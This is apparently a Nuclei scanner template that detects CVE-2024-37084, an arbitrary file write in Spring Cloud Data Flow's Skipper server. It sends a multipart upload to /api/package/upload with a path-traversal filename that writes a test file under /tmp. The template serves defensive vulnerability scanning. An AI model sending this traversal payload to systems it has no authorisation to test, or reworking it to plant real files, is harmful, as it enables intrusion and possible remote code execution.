id: CVE-2024-37084

info:
  name: Spring Cloud Data Flow Skipper Arbitrary File Write
  author: Abdur Rahman Jamil Chowdhury
  severity: critical
  description: |
    Spring Cloud Data Flow versions prior to 2.11.4 are vulnerable to arbitrary file write via the Skipper server API. An attacker can exploit this to write files to arbitrary locations on the server's filesystem, potentially leading to remote code execution.
  references:
    - https://spring.io/security/cve-2024-37084
    - https://nvd.nist.gov/vuln/detail/CVE-2024-37084

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/package/upload"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
    body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="file"; filename="../../../../../../tmp/nuclei_test.txt"
      Content-Type: text/plain

      Nuclei Test File
      ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Package uploaded successfully"
    follow_redirects: true
